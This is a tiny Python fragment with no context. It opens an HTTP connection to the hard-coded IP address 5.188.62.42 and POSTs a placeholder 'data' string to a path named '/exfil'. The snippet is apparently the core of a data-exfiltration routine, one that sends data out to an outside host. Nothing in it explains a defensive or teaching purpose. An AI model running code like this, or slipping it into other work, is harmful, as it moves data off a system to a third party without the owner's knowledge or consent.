import http.client
c = http.client.HTTPConnection("5.188.62.42")
c.request("POST", "/exfil", "data")